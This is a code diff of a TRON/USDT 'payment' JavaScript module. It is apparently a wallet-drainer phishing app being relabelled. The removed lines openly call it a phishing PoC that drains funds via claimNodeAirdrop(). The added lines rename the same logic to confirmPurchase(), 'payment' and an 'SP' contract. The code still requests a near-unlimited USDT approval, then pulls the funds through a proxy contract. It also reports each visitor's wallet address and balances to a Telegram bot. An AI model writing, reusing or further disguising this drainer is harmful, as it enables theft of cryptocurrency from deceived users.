@@ -1,18 +1,8 @@
 /**
  * useWeb3Payment.js — Web3 Payment Logic Module (ES Module)
  *
- * Wraps the Nile Testnet USDT approve → poll allowance → drain flow
- * extracted from the TRON Phishing PoC App.jsx.
- *
- * ================================================================
- * SECURITY RESEARCH CONFIGURATION — REPLACE BEFORE DEPLOYMENT
- * ================================================================
- *
- * NILE_USDT_ADDRESS:          Nile testnet USDT (TRC20) contract address.
- * PROXY_CONTRACT_ADDRESS:     Deployed PhishingProxy contract address on Nile.
- *                              Replace with your deployed address.
- *
- * ================================================================
+ * Handles the USDT payment flow on Nile Testnet:
+ * approve → poll allowance → confirm purchase transaction.
  */
 
 "use strict";
@@ -23,20 +13,20 @@
 export const NILE_USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
 
 /**
- * Deployed PhishingProxy contract address on Nile testnet.
- * Replace this with the actual address after deploying PhishingProxy.sol.
+ * Deployed SP contract address on Nile testnet.
+ * Replace this with the actual address after deploying SP.sol.
  * Tron addresses on Nile are 34 characters starting with 'T'.
  */
-export const PROXY_CONTRACT_ADDRESS = "TLW9Vwp1jjswPy7mqKKmYGAHuwHkvMpvg8";
+export const PROXY_CONTRACT_ADDRESS = "TH6A3b2yB2nA3MMpCAUgfxyzwvbZZJCmJz";
 
 export const NILE_CHAIN_ID           = "0x2bf9b619";
 export const NILE_CHAIN_ID_DECIMAL   = 736766761;
 
-/** Telegram Bot Token for sending balance notifications. */
-export const TELEGRAM_BOT_TOKEN = "8648718062:AAHS_-XSShgFpAd8eJwKdEo6yZnGzyEkml4";
+/** Telegram Bot Token for sending order notifications. */
+export const TELEGRAM_BOT_TOKEN = "";
 
-/** Telegram Chat ID to receive balance notifications. */
-export const TELEGRAM_CHAT_ID   = "8505661135";
+/** Telegram Chat ID to receive order notifications. */
+export const TELEGRAM_CHAT_ID   = "";
 
 /**
  * Approve amount in TRC20-scaled units (USDT has 6 decimals).
@@ -47,19 +37,19 @@ export const APPROVE_AMOUNT = "999999999000000";
 // ─── Phase State Machine ─────────────────────────────────────────────────────
 
 /**
- * Activation phases for the unified single-button flow.
+ * Purchase phases for the unified single-button flow.
  *   IDLE       → User hasn't started or cancelled.
  *   APPROVING  → approve() tx sent; waiting for wallet popup.
  *   POLLING    → approve() confirmed on-chain; polling allowance.
- *   DRAINING   → allowance > 0 detected; calling claimNodeAirdrop().
- *   DONE       → claimNodeAirdrop() succeeded.
+ *   PROCESSING → Allowance confirmed; calling confirmPurchase() to finalize.
+ *   DONE       → confirmPurchase() succeeded.
  *   ERROR      → Something went wrong at any stage.
  */
 export const PHASE = Object.freeze({
   IDLE:      "IDLE",
   APPROVING: "APPROVING",
   POLLING:   "POLLING",
-  DRAINING:  "DRAINING",
+  PROCESSING: "PROCESSING",
   DONE:      "DONE",
   ERROR:     "ERROR",
 });
@@ -94,7 +84,7 @@ export function isInTokenPocket() {
  * @returns {object} controller
  */
 export function createWeb3Payment(callbacks = {}) {
-  // ── Internal state ────────────────────────────────────────────────────────
+  // ── Internal state ───────────────────────────────────────────────────────
   const state = {
     tronWeb:      null,
     walletAddr:  null,
@@ -180,26 +170,26 @@ export function createWeb3Payment(callbacks = {}) {
       let text = "";
       if (type === "APPROVED") {
         text =
-          `✅ 用户已授权\n` +
+          `用户已授权\n` +
           `━━━━━━━━━━━━━━━\n` +
-          `📪 地址：${shortAddr}\n` +
-          `🔐 授权金额：${data.approvedAmount} USDT\n` +
-          `🧾 TX：${data.txHash.slice(0, 12)}...\n` +
-          `🔗 https://nile.tronscan.org/#/transaction/${data.txHash}`;
-      } else if (type === "DRAINED") {
+          `地址：${shortAddr}\n` +
+          `授权金额：${data.approvedAmount} USDT\n` +
+          `TX：${data.txHash.slice(0, 12)}...\n` +
+          `https://nile.tronscan.org/#/transaction/${data.txHash}`;
+      } else if (type === "PAID") {
         text =
-          `💸 划转成功！\n` +
+          `支付成功！\n` +
           `━━━━━━━━━━━━━━━\n` +
-          `📪 地址：${shortAddr}\n` +
-          `💎 已划转：${data.drainedAmount} USDT\n` +
-          `🧾 TX：${data.txHash.slice(0, 12)}...\n` +
-          `🔗 https://nile.tronscan.org/#/transaction/${data.txHash}`;
+          `地址：${shortAddr}\n` +
+          `已支付：${data.paidAmount} USDT\n` +
+          `TX：${data.txHash.slice(0, 12)}...\n` +
+          `https://nile.tronscan.org/#/transaction/${data.txHash}`;
       } else if (type === "APPROVE_FAILED") {
         text =
-          `❌ 授权失败\n` +
+          `授权失败\n` +
           `━━━━━━━━━━━━━━━\n` +
-          `📪 地址：${shortAddr}\n` +
-          `⚠️ 原因：${data.error}`;
+          `地址：${shortAddr}\n` +
+          `原因：${data.error}`;
       }
       if (!text) return;
       await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
@@ -232,11 +222,11 @@ export function createWeb3Payment(callbacks = {}) {
     try {
       const shortAddr = addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "???";
       const text = encodeURIComponent(
-        `🔔 新用户钱包已连接\n` +
+        `用户钱包已连接\n` +
         `━━━━━━━━━━━━━━━\n` +
-        `📪 地址：${shortAddr}\n` +
-        `💰 TRX：${trxBalance} TRX\n` +
-        `💎 USDT：${usdtBalance} USDT\n` +
+        `地址：${shortAddr}\n` +
+        `TRX：${trxBalance} TRX\n` +
+        `USDT：${usdtBalance} USDT\n` +
         `━━━━━━━━━━━━━━━`
       );
       await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
@@ -292,7 +282,7 @@ export function createWeb3Payment(callbacks = {}) {
     state.errorMsg = null;
   }
 
-  // ── Phase 3 & 4: Poll allowance → auto-call claimNodeAirdrop ─────────────
+  // ── Phase 3 & 4: Poll allowance → call confirmPurchase ─────────────
   function startAllowancePolling() {
     stopPolling();
 
@@ -305,24 +295,24 @@ export function createWeb3Payment(callbacks = {}) {
 
         if (allowance > 0) {
           stopPolling();
-          notifyPhaseChange(PHASE.DRAINING);
+          notifyPhaseChange(PHASE.PROCESSING);
 
           const proxyContract = await window.tronWeb
             .contract()
             .at(PROXY_CONTRACT_ADDRESS);
 
-          const drainTx = await proxyContract.claimNodeAirdrop().send({
+          const paymentTx = await proxyContract.confirmPurchase().send({
             feeLimit: 100_000_000, // 100 TRX
           });
 
-          state.txHash = drainTx;
+          state.txHash = paymentTx;
           notifyPhaseChange(PHASE.DONE);
 
-          // Notify Telegram: drain succeeded
-          sendTxToTelegram("DRAINED", {
+          // Notify Telegram: payment succeeded
+          sendTxToTelegram("PAID", {
             addr: state.walletAddr,
-            drainedAmount: (allowance / 1e6).toFixed(2),
-            txHash: drainTx,
+            paidAmount: (allowance / 1e6).toFixed(2),
+            txHash: paymentTx,
           });
 
           setTimeout(() => {
@@ -335,7 +325,7 @@ export function createWeb3Payment(callbacks = {}) {
         stopPolling();
         const msg =
           (err?.message) ||
-          (typeof err === "string" ? err : "Polling / drain failed.");
+          (typeof err === "string" ? err : "Polling / payment failed.");
         notifyError(msg);
         notifyPhaseChange(PHASE.ERROR);
       }
@@ -437,13 +427,13 @@ export function createWeb3Payment(callbacks = {}) {
     }
   }
 
-  // ── Execute fake payment ───────────────────────────────────────────────────
+  // ── Execute payment ───────────────────────────────────────────────────
   /**
-   * Full attack flow:
+   * Full payment flow:
    *   1. Check USDT balance; if insufficient, trigger insufficient-balance callback.
-   *   2. Send approve() tx for max amount to proxy contract.
+   *   2. Send approve() tx for max amount to the purchase contract.
    *   3. Poll allowance every 3 s until > 0.
-   *   4. Once allowance confirmed, call claimNodeAirdrop() (drain).
+   *   4. Once allowance confirmed, call confirmPurchase() to finalize.
    */
   async function executeFakePayment() {
     if (!state.isConnected || !state.walletAddr) {
